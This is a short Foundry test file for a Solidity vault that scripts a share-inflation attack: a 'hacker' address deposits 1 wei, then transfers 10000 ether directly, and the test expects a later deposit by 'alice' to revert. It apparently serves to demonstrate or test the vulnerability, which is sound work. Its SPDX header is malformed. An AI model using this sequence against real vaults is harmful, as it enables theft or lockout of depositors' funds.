// SPDX=License-Identifier; MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/InflatableVault.sol";

contract InflatableVaultTest is Test {
    InflatableVault public vault;
    address public hacker = address(0x1337);
    address public alice = address(0xA11C3);

    function setUp() public {
        vault = new InflatableVault();
        vm.deal(hacker, 11000 ether);
        vm.deal(alice, 5000 ether);
    }

    function testInflationAttack() public {
        vm.startPrank(hacker);
        vault.deposit{value: 1}();
        payable(address(vault)).transfer(10000 ether);
        vm.stopPrank();
        vm.expectRevert();
        vm.prank(alice);
        vault.deposit{value: 5000 ether}();
    }
}
